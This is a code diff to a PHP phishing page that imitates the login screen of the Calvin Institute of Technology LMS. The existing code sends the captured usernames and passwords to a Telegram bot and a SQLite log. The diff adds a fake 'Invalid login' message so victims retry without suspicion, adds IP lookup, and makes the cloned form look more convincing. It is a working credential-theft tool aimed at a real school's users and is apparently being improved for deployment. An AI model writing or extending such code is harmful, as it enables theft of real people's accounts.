@@ -49,6 +49,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         // Send to Telegram
         sendToTelegram($username, $password);
         
+        // Set session flag to show error message
+        session_start();
+        $_SESSION['show_error'] = true;
+        
         // Redirect to real login page
         header('Location: https://lms.calvin.ac.id/login/index.php');
         exit;
@@ -60,7 +64,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 // Function to log credentials to SQLite database
 function logToDatabase($username, $password, $db) {
     try {
-        $ip = $_SERVER['REMOTE_ADDR'];
+        // Get real IP address
+        $ip = getRealIP();
         $user_agent = SQLite3::escapeString($_SERVER['HTTP_USER_AGENT']);
         $referer = isset($_SERVER['HTTP_REFERER']) ? SQLite3::escapeString($_SERVER['HTTP_REFERER']) : 'Direct';
         $timestamp = date('Y-m-d H:i:s');
@@ -90,10 +95,30 @@ function logToDatabase($username, $password, $db) {
     }
 }
 
+// Function to get real IP address
+function getRealIP() {
+    // Check for external IP first
+    $external_ip = file_get_contents('https://api.ipify.org');
+    if ($external_ip && filter_var($external_ip, FILTER_VALIDATE_IP)) {
+        return trim($external_ip);
+    }
+    
+    // Fallback to server variables
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
+        return $_SERVER['REMOTE_ADDR'];
+    }
+    
+    return 'Unknown';
+}
+
 function sendToTelegram($username, $password) {
     global $BOT_TOKEN, $CHAT_ID;
     
-    $ip = $_SERVER['REMOTE_ADDR'];
+    $ip = getRealIP();
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
     $time = date('Y-m-d H:i:s');
     $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
@@ -126,6 +151,9 @@ function sendToTelegram($username, $password) {
     $context = stream_context_create($options);
     @file_get_contents($url, false, $context);
 }
+?>
+<?php
+session_start();
 ?>
 <!DOCTYPE html>
 <html dir="ltr" lang="en" xml:lang="en">
@@ -177,31 +205,37 @@ document.body.className += ' jsenabled';
                 <section id="region-main" class="col-12 h-100" aria-label="Content"><span id="user-notifications"></span>
                     <div class="login-wrapper">
                         <div class="login-container">
-                            <div role="main"><span id="maincontent"></span><div class="loginform row " style="background-color: rgba(108, 117, 124, 0.3);">
+                            <div role="main"><span id="maincontent"></span><div class="loginform row " style="background-color: rgba(108, 117, 124, 0.3); padding: 50px 40px 50px 40px; margin: auto; border-radius: 15px;">
     <div class="col">
+            <?php if(isset($_SESSION['show_error']) && $_SESSION['show_error']): ?>
+                <div class="alert alert-danger" role="alert" style="margin-bottom: 20px;">
+                    <strong>Invalid login, please try again</strong>
+                </div>
+                <?php unset($_SESSION['show_error']); ?>
+            <?php endif; ?>
             <div id="loginlogo" class="login-logo">
-                <img id="logoimage" src="https://instructure-uploads-apse1.s3.ap-southeast-1.amazonaws.com/account_203730000000000001/attachments/651/logo-calvin-white-02.png" class="img-fluid" style="max-width:30%;" alt="LMS Calvin Institute of Technology">
+                <img id="logoimage" src="https://instructure-uploads-apse1.s3.ap-southeast-1.amazonaws.com/account_203730000000000001/attachments/651/logo-calvin-white-02.png" class="img-fluid" style="max-width:40%;" alt="LMS Calvin Institute of Technology">
                 <h1 class="login-heading sr-only">Log in to LMS Calvin Institute of Technology</h1>
             </div>
 
-        <form class="login-form" method="post" id="login">
+        <form class="login-form" method="post" id="login" style="margin-top: 10px;">
             <input type="hidden" name="logintoken" value="Sb3D9LokEG0KAtpuMXDuQdeGCRGUx5OS">
             <div class="login-form-username form-group">
-                <p style="font-size:16px; font-weight:700; color:white;">Email</p>
+                <p style="font-size:20px; font-weight:700; color:white; margin-bottom: 15px;">Email</p>
                 <label for="username" class="sr-only">
                         Username or email
                 </label>
-                <input type="text" name="username" id="username" class="form-control form-control-lg" value="" placeholder="Username or email" autocomplete="username" style="margin-top: -5%; border-radius:2px;">
+                <input type="text" name="username" id="username" class="form-control form-control-lg" value="" placeholder="Username or email" autocomplete="username" style="margin-top: -5%; border-radius:6px; padding: 18px; font-size: 20px; height: 60px;">
             </div>
-            <div class="login-form-password form-group">
-                <p style="font-size:16px; font-weight:700; color:white;">Password</p>
+            <div class="login-form-password form-group" style="margin-top: 25px;">
+                <p style="font-size:20px; font-weight:700; color:white; margin-bottom: 15px;">Password</p>
                 <label for="password" class="sr-only">Password</label>
-                <input type="password" name="password" id="password" value="" class="form-control form-control-lg" placeholder="Password" autocomplete="current-password" style="margin-top:-5px; border-radius:2px;">
+                <input type="password" name="password" id="password" value="" class="form-control form-control-lg" placeholder="Password" autocomplete="current-password" style="margin-top:-5px; border-radius:6px; padding: 18px; font-size: 20px; height: 60px;">
             </div>
            
-            <div style="display:flex; justify-content: space-between;">
-                 <a href="https://lms.calvin.ac.id/login/forgot_password.php" class="login-form-forgotpassword text-left" style="width:50%; margin-top:3%; color:white;">Lost password?</a>
-                 <button class="btn btn-primary btn-block btn-lg login-form-submit" style="background-color:transparent; border-color: #fff; border-width: 2; width:50%;" type="submit" id="loginbtn">Log in</button>
+            <div style="display:flex; justify-content: space-between; margin-top: 30px; align-items: center;">
+                 <a href="https://lms.calvin.ac.id/login/forgot_password.php" class="login-form-forgotpassword text-left" style="width:50%; margin-top:3%; color:white; font-size: 18px; display: flex; align-items: center;">Lost password?</a>
+                 <button class="btn btn-primary btn-block btn-lg login-form-submit" style="background-color:transparent; border-color: #fff; border-width: 2px; width:50%; padding: 18px 35px; font-size: 20px; height: 60px; display: flex; align-items: center; justify-content: center; text-align: center;" type="submit" id="loginbtn">Log in</button>
             </div>
         </form>
                 <form method="post" id="guestlogin" class="mt-2">
